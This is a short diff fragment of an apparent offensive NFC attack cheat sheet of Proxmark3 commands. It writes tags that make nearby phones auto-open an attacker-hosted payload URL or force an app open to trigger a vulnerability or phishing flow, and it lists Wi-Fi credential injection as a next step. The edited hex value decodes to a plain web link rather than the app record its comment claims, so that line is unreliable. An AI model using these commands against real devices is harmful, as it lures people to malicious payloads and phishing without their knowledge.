@@ -146,7 +146,7 @@ pm3 → hf mf ndef -d NdefUri -p "https://attacker.com/payload"
 # Tag placed near NFC-enabled device → phone auto-opens URL
 
 # Write Android Application Record (deep link into app):
-pm3 → hf mfu ndefwrite -d "D20001046170706C69636174696F6E..."
+pm3 → hf mfu ndefwrite -d "D1010B55036578616D706C652E636F6D"
 # Forces target app to open → trigger app vulnerability or phishing flow
 
 # Wi-Fi credential injection via NDEF:
